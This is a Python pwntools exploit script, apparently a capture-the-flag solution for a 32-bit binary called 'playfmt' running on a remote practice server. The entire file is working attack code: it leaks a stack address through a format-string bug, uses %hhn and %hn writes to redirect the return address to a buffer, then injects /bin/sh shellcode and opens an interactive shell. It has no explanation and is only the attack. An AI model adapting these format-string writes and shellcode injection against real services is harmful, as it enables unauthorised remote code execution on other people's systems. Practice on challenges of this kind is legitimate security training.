from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('playfmt')
io = remote('node4.buuoj.cn', 25554)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('playfmt')
buf = elf.sym['buf']

payload = b'%6$p\n'
io.sendlineafter('  Magic echo Server\n=====================\n', payload)
stack = int(io.recvline()[:-1], 16)
ret_addr = stack - 0xc
log.success('stack: ' + hex(stack))
log.success('ret_addr: ' + hex(ret_addr))

payload = b'%' + str.encode(str(ret_addr & 0xff)) + b'c%6$hhn' 
io.sendline(payload)

payload = b'%' + str.encode(str((buf + 4) & 0xffff)) + b'c%10$hn' 
io.sendline(payload)

# gdb.attach(io)
# pause()
shellcode = shellcraft.sh()
payload = b'quit' + asm(shellcode)
io.sendline(payload)
io.interactive()
